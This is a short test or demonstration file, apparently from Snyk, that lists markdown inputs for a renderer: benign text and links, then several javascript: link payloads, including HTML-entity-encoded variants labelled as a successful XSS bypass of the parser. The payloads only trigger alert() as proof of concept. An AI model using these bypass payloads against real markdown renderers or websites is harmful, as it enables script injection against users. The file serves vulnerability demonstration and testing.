# Benign input
Snyk

# Markdown link
This is **markdown**

# Markdown link
[Snyk](https://snyk.io/)

# Failed XSS
[Gotcha](javascript:alert(1))

# Failed XSS despite URL encoding
[Gotcha](javascript&#58;alert(1&#41;)

# Successfull XSS using vuln and browser interpretation
[Gotcha](javascript&#58this;alert(1&#41;)

# Most boasty exploit
[Gotcha](javascript&#58this;alert('marked exploit successful'&#41;)
